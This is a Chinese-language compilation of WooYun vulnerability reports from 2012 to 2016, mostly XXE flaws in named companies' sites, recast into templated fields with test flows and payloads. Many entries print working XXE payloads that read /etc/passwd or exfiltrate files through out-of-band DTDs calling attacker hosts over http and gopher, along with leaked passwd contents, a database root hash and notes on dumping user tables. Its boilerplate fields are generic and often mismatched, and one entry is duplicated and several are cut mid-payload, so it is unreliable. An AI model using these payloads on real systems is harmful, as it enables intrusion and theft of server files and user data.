
---
### [wooyun-2014-078509] 蘑菇街存在XXE漏洞
**厂商**: 蘑菇街 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 二哥的典型例子：https://example.com/[已脱敏] 电话 邮箱 学校等信息，信息过长的话又会被忽略返回数据。所有普通看一些文件是行不通的，可利用的话就访问网站和dos攻击了。

**POC**: 以下证明其可以进行网站的访问：首先在自己的网站部署一个页面：内有少量数据如：http://xxxx/xxe.htm构造如下的xml实体：<!DOCTYPE ANY [<!ENTITY xee SYSTEM "http://xxxxx/xxe.htm">]><w:t>&xee;@某域名.com</w:t>将这份docx提交，最终被解析成对用数据

**绕过**: 直接利用

**修复**: 换用安全的解析库顺便问下，你们校招人数是不是很少,10个都不招1个？
---

---
### [wooyun-2013-032647] 掌阅读iReader签到活动可获取任意数量阅饼（人民币50:1）
**厂商**: zhangyue.com | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先得到自己手机签到和抽奖时候的链接，下次可以直接用浏览器访问链接签到、抽奖。抽奖时候的连接类似这样的（XXX是替代字符）：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这东西真心和金钱挂钩的话，我想用https+post可能会更安全些。
---

---
### [wooyun-2014-077146] 天翼云一处xxe漏洞可读取任意文件
**厂商**: 某邮箱服务业务支撑中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 解压缩docx文件，修改word/document.xml某邮箱服务的文件预览页存在该问题。<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE ANY [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><w:document xmlns:ve="https://example.com/[已脱敏]" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="https://example.com/[已脱敏]" xmlns:m="https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 处理解析
---

---
### [wooyun-2015-0156549] edusoho某处无需登录xxe任意读取
**厂商**: edusoho.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0169109] 人人网某分站存在Blind XXE 漏洞
**厂商**: 人人网 | **年份**: 2016 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可参考WooYun: 唯品会存在Blind XXE 漏洞https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏] 人人网某分站存在任意文件下载漏洞对应上

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2016-0205725] 某运营商某省系统Blink XXE
**厂商**: 某运营商 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试地址：http://**.**.**.**/问题点在这个地方：http://**.**.**.**/webservice/services/webservice?wsdl

**POC**: 构造：<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "test">%remote;]>获取系统目录：根据返回可以看到当前定义的文件参数实体被引用了。远程xml：<!ENTITY % a SYSTEM "file:///"> <!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://ip:80/%a;'>"> %b; %c;注入：<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTI

**绕过**: 直接利用

**修复**: 禁用外部xml实体解析。
---

---
### [wooyun-2014-074048] 139邮箱XXE漏洞可读取文件
**厂商**: 10086.cn | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: /opes/preview.do 输入处理不当可以通过sid取回文件内容<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE ANY [<!ENTITY all SYSTEM "file:///etc/passwd">]>...<string name="sid">&all;</string>...

**POC**: /etc/passwd:sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:4294967294:4294967294:Anonymous NFS User:/var/lib/nfs:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/no

**绕过**: 直接利用

**修复**: 要修复找永中
---

---
### [wooyun-2016-0181424] TurboGate邮件网关漏洞合集
**厂商**: turbomail.org | **年份**: 2016 | **类型**: 默认配置不当

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 默认配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别默认配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: TurboGate其实相当于TurboMail的早期版本，TurboGate集成了大量的在TurboMail中出现的漏洞。这里只列出无需登录即可利用的漏洞，厂商可以根据TurboMail漏洞进行自查。1. http://**.**.**.**/bugs/wooyun-2016-0167905在TurboGate中使用的是axis2<=1.5.1版本，存在XXE漏洞，在利用的时候需要将Content-Type设置为application/xml，POST包如下：POST /services/TM_User.TM_UserHttpSoap11Endpoint/ HTTP/1.0SOAPAction: "urn:getUserOrgList"Content-Type: application/xmlContent-Length: 873Host: **.**.**.**<?xml version

**POC**: 同上

**绕过**: 直接利用

**修复**: 参考TurboMail修复方法
---

---
### [wooyun-2016-0169258] 某航空公司Blind XXE 漏洞
**厂商**: xiamenair.com | **年份**: 2016 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 具体的漏洞原理可以参考https://example.com/[已脱敏]

**POC**: 自己定义XML文件如下：<!ENTITY % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY % trick SYSTEM 'http://(自己的域名)/?xxe_l=%info;'>">%int;%trick;将代码放入到自己的VPS上面。在WVS加入代码<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://example.com/[已脱敏]">%remote;]>如图：收到返回包：

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0168457] 唯品会存在Blind XXE 漏洞
**厂商**: 唯品会 | **年份**: 2016 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 关于XXE,觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。具体的漏洞原理可以参考https://example.com/[已脱敏] Xfire文件读取漏洞只能说这是被小瞧的问题，仅作预警和漏洞验证（赶紧内部检查一下所有使用xfire组件的网站吧！！！）

**POC**: xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生问题网站：https://example.com/[已脱敏] % a SYSTEM "file:///"> <!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://ip:port/%a;'>"> %b; %c;将xml文件保存在vps中 为http://ip:port/1.xml然后构造如下：<?xml version="1.0" encoding

**绕过**: 直接利用

**修复**: 升级XFire为Apache CXF
---

---
### [wooyun-2015-0135336] 某证券通用文件遍历读取(涉及大量证券公司)
**厂商**: 证券行业 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某证券存在XXE导致目录或文件可被读取以下是10个证券类的案例:http://**.**.**.**/ubsiServlet?xml=<!DOCTYPE foo [<!ENTITY  xxe SYSTEM "file:///">]><ubsi service="service" method="method"><object type="Integer">%26xxe;</object></ubsi>http://**.**.**.**/ubsiServlet?xml=<!DOCTYPE foo [<!ENTITY  xxe SYSTEM "file:///">]><ubsi service="service" method="method"><object type="Integer">%26xxe;</object></ubsi>http://**.**.**.**/ubsiServl

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复XXE,如果接口没用的话可以屏蔽掉。
---

---
### [wooyun-2016-0169193] 101远程教育网某分站存在Blind XXE 漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞详情http://**.**.**.**/bugs/wooyun-2016-0168457漏洞地址http://**.**.**.**//live800/services/IVerification?wsdl

**POC**: 漏洞截图证明

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2016-0169188] 易方达基金某系统存在Blind XXE 漏洞
**厂商**: 某基金公司 | **年份**: 2016 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2015-0135615] wemall某互联网公司开源PHP商城系统一处blind xxe（无需登录，附POC）
**厂商**: www.inuoer.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试版本wemall 3.3下载地址 https://example.com/[已脱敏] 需要开源中国的账号//Application\Lib\Action\Admin\WechatAction.class.php<?phpclass WechatAction extends Action {public function init() {import ( 'wechat', APP_PATH . 'Common', '.class.php' );$config = M ( "Wxconfig" )->where ( array ("id" => "1") )->find ();$options = array ('token' => $config ["token"], // 填写你设定的key'enc

**POC**: 下面是存在xxe的https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: https://example.com/[已脱敏]
---

---
### [wooyun-2014-065613] 某互联网公司某示例代码函数使用不当可能会导致第三方厂商躺枪
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 默认配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 默认配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别默认配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 从官方下了最新的某互联网公司开放平台接入示例文件（php）https://example.com/[已脱敏] = $GLOBALS["HTTP_RAW_POST_DATA"];//extract post dataif (!empty($postStr)){$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);$fromUsername = $postObj->FromUserName;$toUsername = $postObj->ToUserName;$keyword = trim($postObj->Content)使用了simplexml_load_string函数来解析p

**POC**: WooYun: PHPYUN最新版任意文件读取漏洞WooYun: PHPYUN最新版XML注入及SQL注入获取管理员账号（无视任何防御）这两个phpyun的虽然没公开 但根据厂家回复基本能确定就是某互联网公司api出的问题另外最新版discuzx3.2也是 默认安装就带有某互联网公司插件，但是未启用。换而言之 未初始化TOKEN。/source/plugin/wechat/wechat.lib.class.php行153$postdata = file_get_contents("php://input");if ($postdata) {if (!$this->_checkSignature()) {ret

**绕过**: 过滤绕过

**修复**: 慎用simplexml_load_string检查权限之前判断是否初始化了token示例代码要用心啊。。人家都是很放心的用你的代码的。
---

---
### [wooyun-2016-0169212] 安利中国存在Blind XXE 漏洞
**厂商**: amway.com.cn | **年份**: 2016 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 具体的漏洞原理可以参考https://example.com/[已脱敏]

**POC**: 自己定义XML文件如下：<!ENTITY % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY % trick SYSTEM 'http://(自己的域名)/?xxe_l=%info;'>">%int;%trick;将代码放入到自己的VPS上面。在WVS加入代码<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://example.com/[已脱敏]">%remote;]>如图：收到返回：[11/Jan

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0109725] 中通某处XXE漏洞可读取服务器任意文件
**厂商**: 中通速递 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 反编译你们中天系统的时候发现了这个URL http://[IP已脱敏] xml数据,试试看.提交数据:服务器监听数据:[IP已脱敏] - - [22/Apr/2015:17:33:03 +0800] "GET /evil.dtd HTTP/1.1" 200 125 "-" "-"[IP已脱敏] - - [22/Apr/2015:17:33:03 +0800] "GET /?;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions%5D%0D%0A%5Bmci%20extensions%5D%0D%0A%5Bfiles%5D%0D%0A%5BMail%5D%0D%0AMAPI=1 HTTP/1.1" 403 4958 "-" 

**POC**: 反编译你们中天系统的时候发现了这个URL http://[IP已脱敏] xml数据,试试看.提交数据:服务器监听数据:[IP已脱敏] - - [22/Apr/2015:17:33:03 +0800] "GET /evil.dtd HTTP/1.1" 200 125 "-" "-"[IP已脱敏] - - [22/Apr/2015:17:33:03 +0800] "GET /?;%20for%2016-bit%20app%20support%0D%0A%5Bfonts%5D%0D%0A%5Bextensions

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0169209] 长安汽车存在Blind XXE 漏洞
**厂商**: 某汽车公司 | **年份**: 2016 | **类型**: 

**元思考**: 触发信号: 功能测试

**洞察**: 防护不足，开发者信任前端输入

**测试流程**:
1. 识别相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 类似的可以参考 https://example.com/[已脱敏]

**POC**: 漏洞在：https://example.com/[已脱敏] % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY % trick SYSTEM 'http://(自己的域名)/?xxe_l=%info;'>">%int;%trick;将代码放入到自己的VPS上面。在WVS加入代码<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % rem

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-09351] pull-in任意文件遍历/下载
**厂商**: pull-in | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL：https://example.com/[已脱敏] version="1.0"?><!DOCTYPE foo [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><methodCall><methodName>&xxe;</methodName></methodCall>

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1.检查所使用的底层xml解析库，默认禁止外部实体的解析；2.更新补丁：存在漏洞的版本: [IP已脱敏].0 RC12.0.0 beta4等更早版本漏洞修补后的版本: [IP已脱敏].0 RC22.0.0 beta5修补方案：根据相对应的版本进行升级升级地址链接: http://fr
---

---
### [wooyun-2015-0107183] 用友某站root权限XXE
**厂商**: 用友软件 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2016-0210560] 搜狗某站文件读取/列目录(Java环境Blind XXE)
**厂商**: 搜狗 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] Accesslog验证一下。1的文件内容如下：<?xml version="1.0" enco

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: .
---

---
### [wooyun-2014-076041] Discuz! xxe 可破坏数据库结构，导致脏数据进入
**厂商**: Discuz! | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先我们看文件:portalcp_diy.php（lines:301-324）:if (submitcheck('importsubmit')) {$isinner = false;$filename = '';if($_POST['importfilename']) {$filename = DISCUZ_ROOT.'./template/default/portal/diyxml/'.$_POST['importfilename'].'.xml';$isinner = true;} else {$upload = new discuz_upload();$upload->init($_FILES['importfile'], 'temp');$attach = $upload->attach;if(!$upload->error()) {$upload->save();}if($upl

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0188574] 唯品会某系统存在远程XXE读取任意文件漏洞
**厂商**: 唯品会 | **年份**: 2016 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参看陈老师的“Xfire文件读取漏洞”WooYun: Xfire文件读取漏洞系统连接：汉启的邮件系统http://[IP已脱敏]

**POC**: evil.dtd内容：<?xml version="1.0" encoding="UTF-8"?><!ENTITY % all"<!ENTITY &#x25; send SYSTEM 'http://remote_ip/?%file;'>">%all;list.xml文件内容：<!ENTITY % a SYSTEM "file:///"><!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://remote_ip:port/?%a;'>">%b;%c;

**绕过**: 直接利用

**修复**: 1.联系厂商，参看陈老师的“Xfire文件读取漏洞”WooYun: Xfire文件读取漏洞
---

---
### [wooyun-2014-074215] 某通用型系统SQL注射（涉及大量企业） ##18
**厂商**: 某科技公司 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 功能测试

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 谷歌或者某搜索引擎搜索：技术支持：常州市某科技公司有限公司技术支持：某科技公司厂商主页：https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: Null
---

---
### [wooyun-2016-0169171] 金山游戏存在Blind XXE 漏洞
**厂商**: 金山网络 | **年份**: 2016 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 具体的漏洞原理可以参考https://example.com/[已脱敏]

**POC**: 自己定义XML文件如下：<!ENTITY % info "1234 zczxc  asdfasd asdfada"><!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://(自己的域名)/?xxe_l=%info1;'>">%int;%trick;将代码放入到自己的VPS上面。加入代码<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://example.com/[已脱敏]">%remote;]>如图：收到返回：[11/Ja

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0118639] 企业航旅通业务销售平台客户端XML注入（泄露全站用户数据）
**厂商**: rtpnr.com | **年份**: 2015 | **类型**: 用户敏感数据泄漏

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 用户敏感数据泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户敏感数据泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、因为官网没有下载客户端的地方，所以我在它的一个用户网站下载的2、登陆的时候抓包3、参数加个*跑了一下，14个裤子4、当前库5、B2C_02库， User表

**POC**: 这个是全部的数据库，就是泄露百万订单的那个吧，之前跑过 - -。

**绕过**: 直接利用

**修复**: POST /AOIS/YSTA.asmx HTTP/1.1SOAPAction: "https://example.com/[已脱敏]"Content-Type: text/xml; charset="utf-8"User-Agent: CodeGear SOAP 1.3Host: www.bja
---

---
### [wooyun-2016-0203510] 某门户网站焦点主站Blind XXE利用Cloudeye神器测试
**厂商**: 某门户网站 | **年份**: 2016 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某门户网站焦点主站的，发现这个Blind XXE，用乌云神器Cloudeye测试发现执行结果的时间相对较长，说明已经执行了，看cloudeye收到的日志吧有返回了，说明是存现xxe的构造外部实体，试了file伪协议，发现没有返回值。。。估计是被禁用了，于是试了data，php(base64)都没有返回值于是想到xxe可以探测端口，于是试了一下原理：探测本机ssh端口的时候发现返回时间很长，说明是开放的。如果不存在，会返回一个很短的时间。这种Blind XXE又禁用了相关伪协议的问题比较DT。。。发出来和大家交流一下吧~

**POC**: 某门户网站焦点主站的，发现这个Blind XXE，用乌云神器Cloudeye测试发现执行结果的时间相对较长，说明已经执行了，看cloudeye收到的日志吧有返回了，说明是存现xxe的构造外部实体，试了file伪协议，发现没有返回值。。。估计是被禁用了，于是试了data，php(base64)都没有返回值于是想到xxe可以探测端口，于是试了一下原理：探测本机ssh端口的时候发现返回时间很长，说明是开放的。如果不存在，会返回一个很短的时间。这种Blind XXE又禁用了相关伪协议的问题比较DT。。。发出来和大家交流一下吧~

**绕过**: 直接利用

**修复**: 你懂的~
---

---
### [wooyun-2016-0188569] 驴妈妈旅游网某业务系统存在XXE漏洞
**厂商**: 驴妈妈旅游网 | **年份**: 2016 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参看连接： Xfire文件读取漏洞WooYun: Xfire文件读取漏洞存在问题的连接：https://example.com/[已脱敏]

**POC**: evil.dtd内容：<?xml version="1.0" encoding="UTF-8"?><!ENTITY % all"<!ENTITY &#x25; send SYSTEM 'http://remote_ip/?%file;'>">%all;list.xml文件内容：<!ENTITY % a SYSTEM "file:///"><!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://remote_ip:port/?%a;'>">%b;%c;

**绕过**: 直接利用

**修复**: 1.可以联系厂商，参考WooYun: Xfire文件读取漏洞的修复方案
---

---
### [wooyun-2013-046188] 中国网络电视台某处SQL注射漏洞
**厂商**: 中国网络电视台 | **年份**: 2013 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1）测试注入点如下，存在注入的参数为columnid；https://example.com/[已脱敏] Server: MySQL >=5Current User: 	api@cms24Sql Version: 	5.1.61-logCurrent DB: 	mvsSystem User: 	api@[IP已脱敏]Host Name: 	cboxup9DB User & Pass: 	root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9:localhostapi:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9:10.7.

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0113722] 某证券公司root权限XXE漏洞
**厂商**: 某证券公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://[IP已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 处理解析
---

---
### [wooyun-2014-078509] 蘑菇街存在XXE漏洞
**厂商**: 蘑菇街 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 二哥的典型例子：https://example.com/[已脱敏] 电话 邮箱 学校等信息，信息过长的话又会被忽略返回数据。所有普通看一些文件是行不通的，可利用的话就访问网站和dos攻击了。

**POC**: 以下证明其可以进行网站的访问：首先在自己的网站部署一个页面：内有少量数据如：http://xxxx/xxe.htm构造如下的xml实体：<!DOCTYPE ANY [<!ENTITY xee SYSTEM "http://xxxxx/xxe.htm">]><w:t>&xee;@某域名.com</w:t>将这份docx提交，最终被解析成对用数据

**绕过**: 直接利用

**修复**: 换用安全的解析库顺便问下，你们校招人数是不是很少,10个都不招1个？
---
